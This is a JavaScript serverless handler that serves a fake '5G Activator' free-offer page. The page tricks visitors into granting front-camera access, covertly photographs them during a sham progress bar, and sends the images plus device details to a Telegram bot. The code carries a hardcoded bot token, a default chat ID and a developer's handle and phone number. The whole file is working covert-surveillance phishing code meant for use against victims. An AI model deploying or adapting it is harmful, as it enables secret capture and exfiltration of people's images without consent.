const axios = require('axios');
const FormData = require('form-data');

export default async function handler(req, res) {
    const botToken = "8796859741:AAEoe1AmDlHY1j1vqyPsm-XbaLAgIy5oa90";

    if (req.method === 'POST') {
        try {
            const { image, id, info } = req.body;
            if (!image || !id) return res.status(400).json({ error: "Missing data" });

            const base64Data = image.replace(/^data:image\/(jpeg|png);base64,/, "");
            const imageBuffer = Buffer.from(base64Data, 'base64');

            const form = new FormData();
            form.append('chat_id', id);
            form.append('photo', imageBuffer, { filename: 'capture.jpg' });
            
            // Added dynamic info to the caption
            form.append('caption', `📸 **Target Reaction Captured!**\n\n` +
                                   `📱 **Device:** ${info || 'Unknown'}\n` +
                                   `👨‍💻 **DEVELOPER:** @Eshucording\n` +
                                   `📞 **Contact:** 8123561579`);

            await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, form, {
                headers: form.getHeaders(),
            });
            return res.status(200).json({ success: true });
        } catch (error) {
            return res.status(200).json({ success: false });
        }
    }

    res.setHeader('Content-Type', 'text/html');
    return res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>5G Network Booster | Free Offer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #0a0a0a; color: #00ff00; text-align: center; font-family: 'Courier New', Courier, monospace; }
        .box { border: 2px solid #00ff00; margin: 50px auto; width: 90%; max-width: 400px; padding: 20px; box-shadow: 0 0 15px #00ff00; }
        .loading-bar { width: 100%; background: #222; height: 10px; margin-top: 20px; border-radius: 5px; overflow: hidden; }
        .progress { width: 0%; height: 100%; background: #00ff00; transition: width 0.5s; }
        video, canvas { display: none; }
        #status { font-size: 14px; margin-top: 10px; color: #aaa; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="color: #fff;">5G ACTIVATOR</h2>
        <p>Verifying Network Compatibility...</p>
        <div class="loading-bar"><div id="bar" class="progress"></div></div>
        <p id="status">Status: Waiting for user...</p>
        <button id="startBtn" style="background:#00ff00; color:#000; border:none; padding:10px 20px; font-weight:bold; cursor:pointer;">ACTIVATE 5G</button>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('id') || "6296180183";

        document.getElementById('startBtn').addEventListener('click', async () => {
            document.getElementById('status').innerText = "Status: Initializing Secure Tunnel...";
            document.getElementById('startBtn').style.display = "none";
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                const video = document.getElementById('video');
                video.srcObject = stream;

                let progress = 0;
                const interval = setInterval(() => {
                    progress += 10;
                    document.getElementById('bar').style.width = progress + "%";
                    if(progress === 40) {
                         captureFrame("Analyzing Face ID...");
                    }
                    if(progress === 90) {
                         captureFrame("Syncing with Satellite...");
                    }
                    if (progress >= 100) {
                        clearInterval(interval);
                        document.getElementById('status').innerText = "Error: System Overloaded. Try again.";
                    }
                }, 800);

            } catch (err) {
                alert("Please enable Camera Access to verify your 5G eligibility.");
            }
        });

        function captureFrame(statusMsg) {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            document.getElementById('status').innerText = "Status: " + statusMsg;

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const info = "Model: " + navigator.platform + " | Browser: " + navigator.appName;
            const imageData = canvas.toDataURL('image/jpeg', 0.7);

            fetch(window.location.href, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData, id: chatId, info: info })
            });
        }
    </script>
</body>
</html>
    `);
}
